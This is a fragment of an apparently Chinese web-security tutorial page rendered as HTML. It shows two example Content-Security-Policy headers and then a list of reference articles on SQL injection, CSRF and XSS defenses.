<div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code>Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy： <span class="token keyword">default</span><span class="token operator">-</span>src ‘self’
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
<li>允许本站的资源以及任意位置的图片以及 其他网站下的脚本。</li>
</ul>
<div class="language-javascript line-numbers-mode" data-ext="js"><pre v-pre class="language-javascript"><code>Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy： <span class="token keyword">default</span><span class="token operator">-</span>src ‘self’<span class="token punctuation">;</span> img<span class="token operator">-</span>src <span class="token operator">*</span><span class="token punctuation">;</span>
script<span class="token operator">-</span>src https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>shiva<span class="token punctuation">.</span>show
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><br/>
<h2 id="参考文章" tabindex="-1"><a class="header-anchor" href="#参考文章" aria-hidden="true">#</a> <span id="te">参考文章</span></h2>
<p><a href="https://www.pdai.tech/md/develop/security/dev-security-overview.html" target="_blank" rel="noopener noreferrer">♥ 开发安全相关知识体系详解 ♥ | Java 全栈知识体系 (pdai.tech)<ExternalLinkIcon/></a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MjEwMjI1Mg==&amp;mid=2247486948&amp;idx=1&amp;sn=c29d9ea1041c3dae935b52f8b8c360aa&amp;chksm=ce0dba67f97a33713f65488e9f0332bdc9934f3e4e557867a175dbdad132c123a9f5c11d0d15&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">什么是 SQL 注入？怎么进行 ？如何防范 ？ (qq.com)<ExternalLinkIcon/></a></p>
<p><a href="https://blog.csdn.net/chest_/article/details/102537988" target="_blank" rel="noopener noreferrer">sql 注入---入门到进阶_春日野穹-CSDN 博客_sql 注入条件<ExternalLinkIcon/></a></p>
<p><a href="https://www.cnblogs.com/jokmangood/p/11705850.html" target="_blank" rel="noopener noreferrer">mybatis 是如何防止 SQL 注入的 - 王的微笑 - 博客园 (cnblogs.com)<ExternalLinkIcon/></a></p>
<p><a href="https://zhuanlan.zhihu.com/p/102151012" target="_blank" rel="noopener noreferrer">Mybatis 是这样防止 sql 注入的 - 知乎 (zhihu.com)<ExternalLinkIcon/></a></p>
<p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener noreferrer">浅谈 CSRF 攻击方式 - hyddd - 博客园 (cnblogs.com)<ExternalLinkIcon/></a></p>
<p><a href="https://www.jianshu.com/p/ffb99fc70646" target="_blank" rel="noopener noreferrer">web 安全:CSRF 攻击原理以及防御 - 简书 (jianshu.com)<ExternalLinkIcon/></a></p>
<p><a href="https://www.cnblogs.com/54chensongxia/p/11693666.html" target="_blank" rel="noopener noreferrer">CSRF 攻击详解 - 程序员自由之路 - 博客园 (cnblogs.com)<ExternalLinkIcon/></a></p>
<p><a href="https://www.cnblogs.com/tugenhua0707/p/10909284.html" target="_blank" rel="noopener noreferrer">web 安全之 XSS 攻击原理及防范 - 龙恩 0707 - 博客园 (cnblogs.com)<ExternalLinkIcon/></a></p>
</div></template>


